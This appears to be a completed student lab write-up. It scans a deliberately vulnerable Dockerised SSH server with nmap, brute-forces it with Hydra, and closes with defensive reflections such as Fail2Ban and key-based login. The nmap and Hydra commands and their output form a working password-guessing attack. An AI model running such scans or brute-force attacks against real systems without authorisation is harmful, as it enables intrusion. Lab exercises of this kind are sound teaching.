# Testing SSH Security with Nmap and Hydra

In this exercise, you will test two key techniques for testing the security of remote systems:
- detecting open ports and services with the `nmap` tool
- brute-force attacking an SSH service with the `hydra` tool

The purpose of this exercise is to show how attackers obtain information about a system and why securing the SSH service and closing unused ports is crucial for security.

---

# 🐳 Preparing the environment with Docker

Before starting the exercise, set up the target system with Docker on your host computer.
You will have a Docker image with a vulnerable SSH server that allows you to test attacks.

### 🔷 Step 0: Starting the Docker SSH Server

If you haven't already, first build a Docker image named `dvws`:
```bash
sudo apt update
sudo apt install docker-cli
sudo apt install docker.io
wget https://raw.githubusercontent.com/rpritr/KV-Vaje/refs/heads/main/lab09/dvws/Dockerfile
docker build -t dvws .
```

Then start the container:
```bash
sudo docker run -d -p 2222:22 --name dvws-ssh dvws
```

The SSH server will now be available on the host computer at `<target_ip>`, port `2222`, with user `testuser` and password `test123`.

---

# 🧪 Testing SSH Security with Nmap and Hydra

SSH (Secure Shell) is a standard protocol for remote login to a server. Weak passwords or open unnecessary services allow attackers to quickly gain access.
In this exercise, you will first use `nmap` to identify open ports and services, and then use `hydra` to check the strength of passwords.

---

## 1️⃣ Introduction

The goal is for users to learn how to:
✅ Use Nmap to detect open ports and services
✅ Use Hydra to check SSH passwords
✅ Understand the dangers of weak passwords and open services

---

## 2️⃣ Activity

### 🖥️ Instructions

Students will perform the following steps and document the results:

---

### 🔷 Step 1: Scan for open ports with Nmap

First, check which services are available on the target system:

```bash
nmap -sS -sV -O -p- <target_ip>

sudo nmap -sS -sV -O -p 2222 127.0.0.1                                                                                                                                                                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-26 14:14 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00035s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X|6.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
OS details: Linux 5.0 - 6.2
Network Distance: 0 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds

```

Parameters:
- `-sS` — SYN scan (quieter)
- `-sV` — detect service versions
- `-O` — detect operating system (if possible)
- `-p-` — scan all ports (1-65535)

Write down:
- which ports are open
  ```text
  2222/tcp
   ```
- which services are running
  ```text
  SSH (OpenSSH 8.9p1 Ubuntu 3ubuntu0.15)
  ```
- which operating system version was detected
   ```text
  Linux 5.x - 6.x
  ``` 
💡 Reflection: why close unused ports?
```text
Unused open ports increase the attack surface of a system. Attackers can use open ports to discover running services, identify vulnerabilities, and attempt unauthorized access. Closing unnecessary ports improves system security and reduces the risk of attacks.
```

We can find the IP of the server inside the docker environment with the command
```bash
sudo docker inspect dvws-ssh | grep IPAddress
                                                                                                                                                                                        
            "SecondaryIPAddresses": null,
            "IPAddress": "172.17.0.2",
                    "IPAddress": "172.17.0.2",

```
---

### 🔷 Step 2: Verify SSH connection

Make sure SSH service is working:
```bash
ssh testuser@<target_ip> -p 22
```
Password: `test123`
```bash
ssh testuser@127.0.0.1 -p 2222
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:GWWMIFUnvWOJuHlCgxUBsitI96T9RCR4GuC6oQhcI2I
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:2222' (ED25519) to the list of known hosts.
testuser@127.0.0.1's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue May 26 18:09:06 2026 from 172.17.0.1
testuser@6a4740e56cfb:~$ 
```
---

### 🔷 Step 3: Create a password list

For a faster test, create your own password list:
```bash
echo -e "password
123456
test123
admin" > passwords.txt
```

---

### 🔷 Step 4: Brute-force attack with Hydra

Use Hydra to attack:
```bash
hydra -l testuser -P passwords.txt -s 22 <target_ip> ssh
```

Parameters:
- `-l testuser` — username
- `-P passwords.txt` — password list
- `-s 22` — number port
- `<target_ip>` — Server IP address
- `ssh` — protocol

On success, Hydra will print something like this:
```
[22][ssh] host: <target_ip> login: testuser password: test123

hydra -l testuser -P passwords.txt -s 2222 127.0.0.1 ssh                                                                                                                                                                               
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-26 14:32:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking ssh://127.0.0.1:2222/
[2222][ssh] host: 127.0.0.1   login: testuser   password: test123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-26 14:32:08

```

---

## 3️⃣ Analysis and report

Submit a report with the following contents:
- Output of `nmap` results (which services/ports are open)
  ```text
  ## Nmap Scan Results

```bash
sudo nmap -sS -sV -O -p 2222 127.0.0.1
```

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-26 14:35 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).

PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)

OS details: Linux 5.0 - 6.2
```

The Nmap scan detected an open SSH service running on port 2222. The detected operating system was Linux.

- Output of `hydra` results (whether the password was found)
  ## Hydra Results

```bash
hydra -l testuser -P passwords.txt -s 2222 127.0.0.1 ssh
```

```text
[2222][ssh] host: 127.0.0.1   login: testuser   password: test123
1 of 1 target successfully completed, 1 valid password found
```

The Hydra attack successfully identified the correct SSH password (`test123`) for the user `testuser`.

  
- Screenshots of both results
<img width="1688" height="545" alt="VirtualBox_kali-linux-2025 4-virtualbox-amd64_26_05_2026_20_45_26" src="https://github.com/user-attachments/assets/c828b4c2-8466-42b3-b679-1a5d8c799ae5" />

  
- Short comment: why using weak passwords is dangerous and why closing unused ports
  ```text
  Weak passwords are dangerous because attackers can easily guess or brute-force them using automated tools such as Hydra. This can lead to unauthorized access to systems and sensitive data. Unused open ports increase the attack surface of a system. Attackers can scan open ports to discover running services and possible vulnerabilities. Closing unnecessary ports improves overall system security.
  ```

## 4️⃣ Reflection and analysis

- How would you protect the SSH server from brute-force attacks?
 ```text
SSH servers can be protected from brute-force attacks by using strong passwords, disabling password authentication, and using SSH keys instead. Additional protection methods include changing the default SSH port, limiting login attempts, configuring a firewall, and using tools such as Fail2Ban to automatically block suspicious login attempts.
  ```
- What additional measures (e.g. limits on the number of logins, use of public-private keys, firewall) would you recommend?
   ```text
   Additional security measures include limiting the number of login attempts, enabling firewall rules, using public-private SSH keys instead of passwords, disabling root login, and using tools such as Fail2Ban to block repeated failed login attempts.
    ```
- How does the result change if we use a very strong password?
 ```text
- If a very strong password is used, brute-force attacks become significantly more difficult and time-consuming. Hydra would require many more attempts, making it much less likely that the password could be successfully guessed.
   ```
